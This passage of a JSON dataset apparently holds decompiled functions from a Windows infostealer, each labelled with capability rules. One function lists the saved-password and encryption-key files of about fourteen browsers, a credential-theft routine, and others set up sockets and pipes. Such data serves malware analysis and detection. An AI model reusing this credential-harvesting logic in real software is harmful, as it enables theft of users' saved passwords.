        "decompiled_code": "\nvoid __cdecl fcn.00401bed(int32_t arg_8h)\n\n{\n    uint32_t arg_ch;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack20;\n    uchar *arg_8h_00;\n    \n    uStack20 = 0x401bfa;\n    fcn.00401875();\n    arg_ch = 0;\n    if (*(arg_8h + 8) != 0) {\n        do {\n            arg_8h_00 = &stack0xffffffd8;\n            fcn.004018c2(&stack0xffffffd8, arg_ch);\n            fcn.00401776(arg_8h_00, arg_ch, uStack40, uStack36, uStack32);\n            arg_ch = arg_ch + 1;\n        } while (arg_ch < *(arg_8h + 8));\n    }\n    return;\n}\n",
        "token_count": 201
    },
    "00402093": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402093(int32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    uint32_t arg_ch;\n    uchar auStackY32 [12];\n    uint uStackY20;\n    uchar *arg_8h_00;\n    \n    arg_ch = 0;\n    *(in_ECX + 0xc) = 5;\n    *(in_ECX + 4) = 5;\n    *(in_ECX + 8) = 0;\n    uStackY20 = 0x4020ae;\n    fcn.00402110();\n    if (*(arg_8h + 8) != 0) {\n        do {\n            arg_8h_00 = &stack0xffffffe0;\n            fcn.00402164(&stack0xffffffe0, arg_ch);\n            fcn.00401fcb(arg_8h_00);\n            arg_ch = arg_ch + 1;\n        } while (arg_ch < *(arg_8h + 8));\n    }\n    return;\n}\n",
        "token_count": 227
    },
    "00403ab8": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403ab8(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint32_t arg_ch;\n    uint uStack52;\n    uchar auStack48 [16];\n    \n    arg_ch = 0;\n    uStack52 = 0;\n    auStack48 = ZEXT816(0);\n    fcn.00403740(*(in_ECX + 0x18));\n    fcn.00403761(in_ECX + 4);\n    if (*(in_ECX + 0x10) != 0) {\n        do {\n            arg_8h_00 = fcn.004018c2(auStack48 + 8, arg_ch);\n            fcn.00403761(arg_8h_00);\n            fcn.00405ea5();\n            iVar1 = fcn.004018c2(&uStack52, arg_ch);\n            fcn.00403740(*(iVar1 + 0x10));\n            fcn.00405ea5();\n            iVar1 = fcn.004018c2(&stack0xffffffc0, arg_ch);\n            fcn.00403717(*(iVar1 + 8), *(iVar1 + 0xc));\n            fcn.00405ea5();\n            arg_ch = arg_ch + 1;\n        } while (arg_ch < *(in_ECX + 0x10));\n    }\n    fcn.00403679(arg_8h);\n    fcn.00403665();\n    return arg_8h;\n}\n",
        "token_count": 343
    },
    "00404373": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404373(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint32_t arg_ch;\n    uint uStack56;\n    uint uStack52;\n    uchar auStack48 [16];\n    uchar auStack32 [28];\n    \n    uStack56 = 7;\n    arg_ch = 0;\n    uStack52 = 0;\n    auStack48 = ZEXT816(0);\n    if (*(in_ECX + 0xc) != 0) {\n        do {\n            arg_8h_00 = fcn.004018c2(auStack32, arg_ch);\n            fcn.00403761(arg_8h_00);\n            fcn.00405ea5();\n            iVar1 = fcn.004018c2(auStack48 + 4, arg_ch);\n            fcn.00403740(*(iVar1 + 0x10));\n            fcn.00405ea5();\n            iVar1 = fcn.004018c2(&uStack56, arg_ch);\n            fcn.00403717(*(iVar1 + 8), *(iVar1 + 0xc));\n            fcn.00405ea5();\n            arg_ch = arg_ch + 1;\n        } while (arg_ch < *(in_ECX + 0xc));\n    }\n    fcn.00403679(arg_8h);\n    fcn.00403665();\n    return arg_8h;\n}\n",
        "token_count": 329
    },
    "0040447c": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040447c(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint32_t arg_ch;\n    uchar auStack56 [24];\n    uint uStack32;\n    uint uStack28;\n    uchar auStack24 [16];\n    \n    uStack28 = 0;\n    uStack32 = 5;\n    arg_ch = 0;\n    auStack24 = ZEXT816(0);\n    if (*(in_ECX + 0xc) != 0) {\n        do {\n            arg_8h_00 = fcn.00401a43(auStack56, arg_ch);\n            fcn.00403761(arg_8h_00);\n            fcn.00405ea5();\n            iVar1 = fcn.00401a43(auStack56, arg_ch);\n            fcn.00403740(*(iVar1 + 4));\n            fcn.00405ea5();\n            arg_ch = arg_ch + 1;\n        } while (arg_ch < *(in_ECX + 0xc));\n    }\n    fcn.00403679(arg_8h);\n    fcn.00403665();\n    return arg_8h;\n}\n",
        "token_count": 275
    },
    "00404899": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404899(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint32_t arg_ch;\n    uchar auStack60 [4];\n    uint uStack56;\n    uint uStack52;\n    uchar auStack48 [16];\n    \n    uStack56 = 0x1b;\n    arg_ch = 0;\n    uStack52 = 0;\n    iVar1 = in_ECX + 4;\n    auStack48 = ZEXT816(0);\n    fcn.00403761(iVar1);\n    fcn.00403740(iVar1);\n    fcn.004036df(iVar1);\n    fcn.00403761(iVar1);\n    if (*(in_ECX + 0x1c) != 0) {\n        do {\n            arg_8h_00 = fcn.004018c2(auStack48, arg_ch);\n            fcn.00403761(arg_8h_00);\n            fcn.00405ea5();\n            iVar1 = fcn.004018c2(auStack60, arg_ch);\n            fcn.00403740(*(iVar1 + 0x10));\n            fcn.00405ea5();\n            iVar1 = fcn.004018c2(&stack0xffffffb8, arg_ch);\n            fcn.00403717(*(iVar1 + 8), *(iVar1 + 0xc));\n            fcn.00405ea5();\n            arg_ch = arg_ch + 1;\n        } while (arg_ch < *(in_ECX + 0x1c));\n    }\n    fcn.00403679(arg_8h);\n    fcn.00403665();\n    return arg_8h;\n}\n",
        "token_count": 390
    },
    "00407378": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407378(uint32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    uint32_t uVar1;\n    uint var_5ch;\n    \n    fcn.0040626c();\n    uVar1 = 0;\n    if (arg_8h != 0) {\n        do {\n            fcn.004061c5(1);\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < arg_8h);\n    }\n    fcn.0040611f();\n    *(in_ECX + 0x14) = 0;\n    return;\n}\n",
        "token_count": 141
    },
    "0040c1b2": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040c1b2(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uchar *arg_8h_00;\n    uint uVar2;\n    uchar *puVar3;\n    uint uVar4;\n    int32_t iStack60;\n    uchar auStack52 [48];\n    \n    *0x4196a4 = arg_8h;\n    fcn.00413786(auStack52, arg_8h[2], 0);\n    if (iStack60 != 0) {\n        puVar3 = &stack0xffffffc0;\n        fcn.0040304c(puVar3);\n        fcn.00409fb3(puVar3);\n        iVar1 = fcn.00409fda();\n        if (iVar1 != 0) {\n            fcn.0040f76b();\n            fcn.0040f76b();\n            fcn.0040c4a8(L\"\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data\", \n                         L\"\\\\Google\\\\Chrome\\\\User Data\\\\Local State\", 0, 0, 1);\n            fcn.0040c4a8(L\"\\\\Epic Privacy Browser\\\\User Data\\\\Default\\\\Login Data\", \n                         L\"\\\\Epic Privacy Browser\\\\User Data\\\\Local State\", 0, 0, 6);\n            fcn.0040c4a8(L\"\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Login Data\", \n                         L\"\\\\Microsoft\\\\Edge\\\\User Data\\\\Local State\", 0, 0, 7);\n            fcn.0040c4a8(L\"\\\\UCBrowser\\\\User Data_i18n\\\\Default\\\\UC Login Data.17\", \n                         L\"\\\\UCBrowser\\\\User Data_i18n\\\\Local State\", 0, 1, 8);\n            fcn.0040c4a8(L\"\\\\Tencent\\\\QQBrowser\\\\User Data\\\\Default\\\\Login Data\", \n                         L\"\\\\Tencent\\\\QQBrowser\\\\User Data\\\\Local State\", 0, 0, 9);\n            fcn.0040c4a8(L\"\\\\Opera Software\\\\Opera Stable\\\\Login Data\", L\"\\\\Opera Software\\\\Opera Stable\\\\Local State\", \n                         1, 0, 10);\n            fcn.0040c4a8(L\"\\\\Blisk\\\\User Data\\\\Default\\\\Login Data\", L\"\\\\Blisk\\\\User Data\\\\Local State\", 0, 0, 0xb);\n            fcn.0040c4a8(L\"\\\\Chromium\\\\User Data\\\\Default\\\\Login Data\", L\"\\\\Chromium\\\\User Data\\\\Local State\", 0, 0, 0xc\n                        );\n            fcn.0040c4a8(L\"\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default\\\\Login Data\", \n                         L\"\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Local State\", 0, 0, 0xd);\n            fcn.0040c4a8(L\"\\\\Vivaldi\\\\User Data\\\\Default\\\\Login Data\", L\"\\\\Vivaldi\\\\User Data\\\\Local State\", 0, 0, 0xe);\n            fcn.0040c4a8(L\"\\\\Comodo\\\\Dragon\\\\User Data\\\\Default\\\\Login Data\", \n                         L\"\\\\Comodo\\\\Dragon\\\\User Data\\\\Local State\", 0, 0, 0xf);\n            fcn.0040c4a8(L\"\\\\Torch\\\\User Data\\\\Default\\\\Login Data\", L\"\\\\Torch\\\\User Data\\\\Local State\", 0, 0, 0x10);\n            fcn.0040c4a8(L\"\\\\Slimjet\\\\User Data\\\\Default\\\\Login Data\", L\"\\\\Slimjet\\\\User Data\\\\Local State\", 0, 0, 0x11)\n            ;\n            fcn.0040c4a8(L\"\\\\CentBrowser\\\\User Data\\\\Default\\\\Login Data\", L\"\\\\CentBrowser\\\\User Data\\\\Local State\", 0, \n                         0, 0x12);\n            fcn.0040b203();\n            fcn.0040a0d8();\n            puVar3 = &stack0xfffffe94;\n            uVar4 = extraout_ECX;\n            fcn.0040362d(puVar3);\n            fcn.0040a6c8(puVar3);\n            arg_8h_00 = &stack0xfffffe90;\n            uVar2 = extraout_ECX_00;\n            fcn.0040362d(arg_8h_00);\n            fcn.0040ac0a(arg_8h_00);\n            fcn.00409f71(arg_8h_00, uVar2, puVar3, uVar4);\n            fcn.00402093(**0x4196a4);\n            fcn.00402093(&stack0xfffffe90);\n            fcn.00404f2b(&stack0xfffffe9c);\n            fcn.004133f4();\n            if (puVar3 != NULL) {\n                fcn.00401a7e(puVar3);\n            }\n            if (*(**0x4196a4 + 0x10) != 0) {\n                fcn.00405ea5();\n            }\n            fcn.00405ea5();\n            fcn.00405ea5();\n        }\n        fcn.00405eee();\n        fcn.00401f76();\n    }\n    fcn.00403036();\n    return 0;\n}\n",
        "token_count": 1242
    },
    "0041168e": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041168e(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    int32_t *in_ECX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0;\n    var_8h = 0;\n    var_4h = 0;\n    if (*in_ECX == 0) {\n        fcn.0040362d(&var_4h);\n    }\n    else {\n        iVar1 = fcn.00410fc3(arg_ch, &var_ch);\n        if (iVar1 != 0) {\n            arg_8h_00 = fcn.00402ecf(&arg_ch);\n            fcn.00403437(arg_8h_00);\n            fcn.00405ea5();\n        }\n        fcn.0040362d(&var_4h);\n    }\n    fcn.00405ea5();\n    fcn.00403036();\n    return arg_8h;\n}\n",
        "token_count": 235
    },
    "0041223e": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0041223e(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    uint extraout_ECX;\n    uint uStackY108;\n    uint uVar3;\n    uint *puVar4;\n    int32_t var_38h;\n    uint32_t var_30h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint var_5h;\n    \n    *(arg_8h + 8) = 0;\n    *(arg_8h + 0xc) = 5;\n    *(arg_8h + 4) = 5;\n    fcn.00401534();\n    if (*0x54d0b4 == 0) {\n        iVar2 = fcn.00405f53();\n        if (iVar2 == 0) {\n            *0x54d0b4 = 0;\n        }\n        else {\n            *0x54d0b4 = fcn.00412ed4(extraout_ECX);\n        }\n    }\n    fcn.00412c3f(&var_38h);\n    var_10h = 0;\n    if (var_30h != 0) {\n        do {\n            uVar1 = var_10h;\n            var_28h = 0;\n            var_5h._0_1_ = var_10h < var_30h;\n            fcn.00405ca3();\n            iVar2 = var_38h;\n            puVar4 = &var_ch;\n            uVar3 = **(var_38h + uVar1 * 4);\n            fcn.004033bf(uVar3);\n            arg_8h_00 = fcn.0040309d(uVar3);\n            fcn.00403437(arg_8h_00);\n            fcn.00405ea5(arg_8h_00, uVar3, puVar4);\n            var_ch = 0;\n            fcn.00405ea5();\n            fcn.00405ca3();\n            var_24h = *(*(iVar2 + uVar1 * 4) + 8);\n            var_18h = var_24h;\n            fcn.00405ca3();\n            uVar3 = *(*(iVar2 + uVar1 * 4) + 0x10);\n            var_20h = uVar3;\n            fcn.00405ca3();\n            var_1ch = *(*(iVar2 + uVar1 * 4) + 0x14);\n            puVar4 = &var_28h;\n            fcn.0040362d(puVar4);\n            fcn.00401433(puVar4, uStackY108, var_18h, uVar3);\n            fcn.00405ea5();\n            var_10h = var_10h + 1;\n        } while (var_10h < var_30h);\n    }\n    return arg_8h;\n}\n",
        "token_count": 719
    },
    "00401dc8": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401dc8(uint *arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = *arg_8h;\n    in_ECX[1] = arg_8h[1];\n    fcn.0040304c(arg_8h + 2);\n    fcn.0040362d(arg_8h + 4);\n    in_ECX[5] = arg_8h[5];\n    in_ECX[6] = arg_8h[6];\n    fcn.0040362d(arg_8h + 7);\n    in_ECX[8] = arg_8h[8];\n    fcn.0040362d(arg_8h + 9);\n    fcn.0040362d(arg_8h + 10);\n    in_ECX[0xb] = arg_8h[0xb];\n    fcn.0040362d(arg_8h + 0xc);\n    in_ECX[0xd] = arg_8h[0xd];\n    in_ECX[0xe] = arg_8h[0xe];\n    in_ECX[0xf] = arg_8h[0xf];\n    in_ECX[0x10] = arg_8h[0x10];\n    in_ECX[0x11] = arg_8h[0x11];\n    fcn.0040304c(arg_8h + 0x12);\n    return;\n}\n",
        "token_count": 324
    },
    "004023ca": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004023ca(uint *arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = *arg_8h;\n    in_ECX[1] = arg_8h[1];\n    fcn.00402e93(arg_8h + 2);\n    fcn.00403437(arg_8h + 4);\n    in_ECX[5] = arg_8h[5];\n    in_ECX[6] = arg_8h[6];\n    fcn.00403437(arg_8h + 7);\n    in_ECX[8] = arg_8h[8];\n    fcn.00403437(arg_8h + 9);\n    fcn.00403437(arg_8h + 10);\n    in_ECX[0xb] = arg_8h[0xb];\n    fcn.00403437(arg_8h + 0xc);\n    in_ECX[0xd] = arg_8h[0xd];\n    in_ECX[0xe] = arg_8h[0xe];\n    in_ECX[0xf] = arg_8h[0xf];\n    in_ECX[0x10] = arg_8h[0x10];\n    in_ECX[0x11] = arg_8h[0x11];\n    fcn.00402e93(arg_8h + 0x12);\n    return;\n}\n",
        "token_count": 318
    },
    "00403bbb": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403bbb(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x414750;\n    in_ECX[1] = 0;\n    in_ECX[4] = 0;\n    in_ECX[5] = 5;\n    in_ECX[3] = 5;\n    fcn.00401875();\n    fcn.00403437(&arg_ch);\n    fcn.00401bed(&arg_10h);\n    in_ECX[6] = arg_8h;\n    fcn.00405ea5();\n    arg_ch = 0;\n    if (arg_10h != 0) {\n        fcn.00401ad5(arg_10h);\n    }\n    return;\n}\n",
        "token_count": 185
    },
    "00404067": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404067(uint arg_8h)\n\n{\n    int32_t in_ECX;\n    uint arg_8h_00;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    arg_8h_00 = *(in_ECX + 4);\n    fcn.00403740(arg_8h_00);\n    fcn.00403761(arg_8h_00);\n    fcn.00403740(arg_8h_00);\n    fcn.00403740(arg_8h_00);\n    fcn.00403740(arg_8h_00);\n    fcn.00403740(arg_8h_00);\n    fcn.004036fa(arg_8h_00);\n    fcn.00403740(arg_8h_00);\n    fcn.00403679(arg_8h_00);\n    fcn.00403665();\n    return arg_8h;\n}\n",
        "token_count": 214
    },
    "004040ea": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.004040ea(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    uint *in_ECX;\n    \n    in_ECX[1] = arg_8h;\n    *in_ECX = 0x4147e0;\n    fcn.0040362d(&arg_ch);\n    in_ECX[3] = arg_10h;\n    in_ECX[4] = arg_14h;\n    in_ECX[5] = arg_18h;\n    in_ECX[6] = arg_1ch;\n    in_ECX[7] = arg_20h;\n    in_ECX[8] = arg_24h;\n    fcn.00405ea5();\n    return;\n}\n",
        "token_count": 197
    },
    "00404153": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404153(uint arg_8h)\n\n{\n    int32_t in_ECX;\n    uint arg_8h_00;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    \n    fcn.00402f91(*(in_ECX + 4), *(in_ECX + 8));\n    arg_8h_00 = *(in_ECX + 0xc);\n    fcn.00403740(arg_8h_00);\n    fcn.00403740(arg_8h_00);\n    fcn.00403740(arg_8h_00);\n    fcn.00403740(arg_8h_00);\n    fcn.00403761(arg_8h_00);\n    fcn.00403761(arg_8h_00);\n    fcn.00403740(arg_8h_00);\n    fcn.00403740(arg_8h_00);\n    fcn.00403761(arg_8h_00);\n    fcn.00403761(arg_8h_00);\n    fcn.00403679(arg_8h_00);\n    fcn.00403665();\n    return arg_8h;\n}\n",
        "token_count": 274
    },
    "00404241": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00404241(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h, uint arg_2ch, uint arg_30h, uint arg_34h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x4147f0;\n    fcn.0040304c(&arg_8h);\n    in_ECX[3] = arg_10h;\n    in_ECX[4] = arg_14h;\n    in_ECX[5] = arg_18h;\n    in_ECX[6] = arg_1ch;\n    fcn.0040362d(&arg_20h);\n    fcn.0040362d(&arg_24h);\n    in_ECX[9] = arg_28h;\n    in_ECX[10] = arg_2ch;\n    fcn.0040362d(&arg_30h);\n    fcn.0040362d(&arg_34h);\n    fcn.00403036();\n    fcn.00405ea5();\n    arg_20h = 0;\n    fcn.00405ea5();\n    arg_24h = 0;\n    fcn.00405ea5();\n    arg_30h = 0;\n    fcn.00405ea5();\n    return;\n}\n",
        "token_count": 330
    },
    "00404981": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404981(uint *param_1)\n\n{\n    int32_t in_stack_fffffff8;\n    int32_t iVar1;\n    \n    *param_1 = 0x414828;\n    iVar1 = param_1[5];\n    if (iVar1 != 0) {\n        fcn.00401ad5(iVar1);\n        in_stack_fffffff8 = iVar1;\n    }\n    param_1[5] = 0;\n    param_1[7] = 0;\n    param_1[6] = 0;\n    fcn.00405ea5(in_stack_fffffff8);\n    param_1[4] = 0;\n    fcn.00405ea5();\n    param_1[1] = 0;\n    return;\n}\n",
        "token_count": 173
    },
    "004058d3": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "initialize Winsock library"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004058d3(int32_t param_1)\n\n{\n    uint extraout_ECX;\n    \n    fcn.004031c3();\n    *(param_1 + 0x10) = 0;\n    *(param_1 + 0x14) = 0;\n    *(param_1 + 0x30) = 0;\n    *(param_1 + 0x34) = 0;\n    fcn.00410298(extraout_ECX);\n    (*_sym.imp.WS2_32.dll_WSAStartup)(2, param_1 + 0x38);\n    *(param_1 + 0xc) = 0xffffffff;\n    *(param_1 + 0x18) = 0;\n    *(param_1 + 0x24) = 0;\n    return param_1;\n}\n",
        "token_count": 188
    },
    "0040626c": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "hash data using SHA1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040626c(uint *param_1)\n\n{\n    param_1[6] = 0;\n    param_1[5] = 0;\n    *param_1 = 0x67452301;\n    param_1[1] = 0xefcdab89;\n    param_1[2] = 0x98badcfe;\n    param_1[3] = 0x10325476;\n    param_1[4] = 0xc3d2e1f0;\n    return;\n}\n",
        "token_count": 122
    },
    "004078b0": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004078b0(uint arg_8h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    uint *in_ECX;\n    uint *puVar3;\n    uint extraout_ECX;\n    uint uVar4;\n    int32_t iVar5;\n    uint uVar6;\n    uint uVar7;\n    \n    uVar4 = 0;\n    iVar5 = 5;\n    in_ECX[4] = 5;\n    in_ECX[2] = 5;\n    in_ECX[3] = 0;\n    puVar1 = fcn.00405f53();\n    if (puVar1 == NULL) {\n        puVar3 = NULL;\n    }\n    else {\n        puVar3 = puVar1 + 1;\n        *puVar1 = 5;\n        puVar1 = puVar3;\n        do {\n            *puVar1 = 0;\n            puVar1[1] = 0;\n            iVar5 = iVar5 + -1;\n            puVar1 = puVar1 + 2;\n        } while (iVar5 != 0);\n    }\n    in_ECX[1] = puVar3;\n    fcn.0040fece();\n    in_ECX[0xb] = 0xffff;\n    fcn.00403437(&arg_8h);\n    uVar6 = 0x80000000;\n    uVar7 = extraout_ECX;\n    iVar5 = fcn.00410192(0x80000000);\n    if (iVar5 != 0) {\n        uVar2 = in_ECX[10] / 0xffff;\n        in_ECX[0xc] = uVar2;\n        if (in_ECX[10] % 0xffff != 0) {\n            in_ECX[0xc] = uVar2 + 1;\n        }\n        uVar4 = 1;\n    }\n    *in_ECX = uVar4;\n    fcn.00405ea5(uVar6, uVar7);\n    return;\n}\n",
        "token_count": 451
    },
    "004110d7": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004110d7(int32_t *param_1)\n\n{\n    uint unaff_ESI;\n    \n    if (*param_1 != 0) {\n        fcn.00410fae();\n    }\n    fcn.00405c16();\n    fcn.00405ea5();\n    param_1[8] = 0;\n    fcn.00405ea5();\n    param_1[7] = 0;\n    fcn.00405ea5();\n    param_1[6] = 0;\n    fcn.00405ea5();\n    param_1[5] = 0;\n    fcn.00405ea5();\n    param_1[4] = 0;\n    fcn.00410fae();\n    if (*param_1 != 0) {\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(*param_1, unaff_ESI);\n    }\n    *param_1 = 0;\n    return;\n}\n",
        "token_count": 217
    },
    "00411638": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00411638(uint *param_1)\n\n{\n    uint extraout_EDX;\n    \n    *param_1 = 0;\n    param_1[1] = 0;\n    param_1[4] = 0;\n    param_1[5] = 0;\n    param_1[6] = 0;\n    param_1[7] = 0;\n    param_1[8] = 0;\n    fcn.00405bf1();\n    return extraout_EDX;\n}\n",
        "token_count": 117
    },
    "00412bc7": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00412bc7(uint *param_1)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.00405df1();\n    *param_1 = uVar1;\n    uVar1 = fcn.00405df1();\n    param_1[1] = uVar1;\n    param_1[3] = 0;\n    param_1[4] = 0;\n    param_1[5] = 0;\n    param_1[6] = 0;\n    return param_1;\n}\n",
        "token_count": 125
    },
    "00412ed4": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "contain loop"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00412ed4(uint *param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint extraout_ECX;\n    uint32_t arg_8h;\n    \n    arg_8h = 0;\n    param_1[4] = 5;\n    param_1[2] = 5;\n    param_1[3] = 0;\n    uVar1 = fcn.00405f53();\n    param_1[1] = uVar1;\n    param_1[5] = 0x54d0ac;\n    param_1[6] = 0;\n    param_1[7] = 0;\n    param_1[8] = 0;\n    param_1[9] = 0;\n    param_1[10] = 0;\n    param_1[0xb] = 0;\n    param_1[0xc] = 0;\n    param_1[0xd] = 0;\n    iVar2 = fcn.00405f53();\n    if (iVar2 == 0) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = fcn.0041266a(extraout_ECX);\n    }\n    *param_1 = uVar1;\n    fcn.0041290f();\n    if (param_1[3] != 0) {\n        do {\n            fcn.0041273a(arg_8h);\n            arg_8h = arg_8h + 1;\n        } while (arg_8h < param_1[3]);\n    }\n    return param_1;\n}\n",
        "token_count": 364
    },
    "00401f4b": {
        "rules": [
            "create thread"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00401f4b(uint lpStartAddress, uint lpParameter)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, lpStartAddress, lpParameter, 0, in_ECX + 1);\n    *in_ECX = iVar1;\n    return iVar1 != 0;\n}\n",
        "token_count": 94
    },
    "0040eafb": {
        "rules": [
            "create thread"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040eafb(uint arg_8h)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint extraout_ECX;\n    uint uVar5;\n    uint arg_10h;\n    uint arg_14h;\n    uint *arg_8h_00;\n    uint lpPipeAttributes;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint hReadPipe;\n    uint hWritePipe;\n    \n    fcn.0040ea89();\n    hReadPipe = 0;\n    var_ch = 0;\n    hWritePipe = 0;\n    uVar5 = 1;\n    var_10h = 0;\n    var_14h = 0;\n    var_1ch = 0;\n    lpPipeAttributes = 0xc;\n    var_18h = 1;\n    iVar3 = (*_sym.imp.KERNEL32.dll_CreatePipe)(&hReadPipe, &hWritePipe, &lpPipeAttributes, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetCurrentProcess;\n    if (iVar3 != 0) {\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(&var_ch, 0, 1, 2);\n        uVar4 = (*pcVar1)(hWritePipe, uVar4);\n        pcVar2 = _sym.imp.KERNEL32.dll_DuplicateHandle;\n 